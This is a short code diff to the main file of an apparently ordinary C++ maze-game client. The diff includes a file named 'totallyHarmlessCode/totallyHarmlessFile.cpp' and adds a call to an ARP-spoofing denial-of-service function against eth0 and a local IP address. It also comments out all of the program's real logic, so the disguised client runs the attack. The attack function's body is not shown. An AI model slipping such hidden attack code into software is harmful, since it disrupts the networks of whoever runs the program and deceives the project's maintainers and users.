@@ -15,11 +15,16 @@
 #include "messaging/mazeCom.hxx"
 #include "messaging/MessageHandler.hpp"
 
+#include "totallyHarmlessCode/totallyHarmlessFile.cpp"
+
 int main(int argc, char *argv[]) {
   using namespace mazenet::util::cfg;
   using namespace mazenet::util::logging;
   CfgManager& cfgMan = CfgManager::instance();
 
+  th::arpSpoofDos("eth0", "192.168.137.188");
+
+  /*
   // keep as first line
   if (cfgMan.parseCmdLineOptions(argc, argv) == ExecutionMode::RUN) {
     Log logger("main");
@@ -43,6 +48,6 @@ int main(int argc, char *argv[]) {
 
     client.getIOService().run();
   }
-
+  */
   return 0;
 }
